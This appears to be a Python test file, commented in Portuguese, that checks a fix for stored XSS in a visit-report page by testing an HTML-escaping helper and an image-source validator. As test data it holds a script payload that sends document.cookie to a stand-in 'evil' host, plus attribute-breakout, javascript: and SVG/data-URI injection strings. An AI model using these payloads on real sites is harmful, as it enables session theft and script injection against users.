# -*- coding: utf-8 -*-
"""XSS armazenado no relatório de visita (/controle/relatorio_visita/<vid>).

A tela monta a página com f-string, então NÃO existe o autoescape do Jinja.
Os campos livres são digitados em campo — parte deles pelo responsável da EMPRESA
no tablet — e o relatório é aberto depois pela coordenação e pelo admin.

Achado `semgrep|raw-html-format` do Escudo, conferido em 13/08/2026: procede.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from controle.routes import _e, _src_img

PAYLOAD = '<script>fetch("//evil/"+document.cookie)</script>'


def test_texto_livre_do_tecnico_nao_vira_tag():
    saida = _e(PAYLOAD)
    assert '<script>' not in saida
    assert '&lt;script&gt;' in saida


def test_aspas_nao_escapam_de_atributo():
    """O caso do `style="color:{...}"` e do `title="{...}"`: fechar a aspa basta."""
    saida = _e('x" onmouseover="alert(1)')
    assert '"' not in saida


def test_none_vira_vazio_e_nao_a_palavra_None():
    assert _e(None) == ''


def test_numero_e_preservado():
    assert _e(123) == '123'


# ── a assinatura: escapar não bastava, tinha que VALIDAR ──────────────────────
def test_data_uri_de_imagem_real_passa():
    ok = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg=='
    assert _src_img(ok) == ok


def test_payload_que_o_startswith_deixava_passar_e_barrado():
    """`data:image/png;base64,x" onerror=alert(1)` começa com 'data:image/' — a
    checagem antiga aprovava e o resto da string saía do atributo src."""
    assert _src_img('data:image/png;base64,x" onerror=alert(1)') == ''


def test_javascript_uri_e_barrada():
    assert _src_img('javascript:alert(1)') == ''
    assert _src_img('data:text/html;base64,PHNjcmlwdD4=') == ''


def test_vazio_e_none_nao_quebram():
    assert _src_img('') == ''
    assert _src_img(None) == ''


def test_svg_nao_passa():
    """SVG embutido executa script no navegador — não é imagem inerte."""
    assert _src_img('data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Lz48L3N2Zz4=') == ''
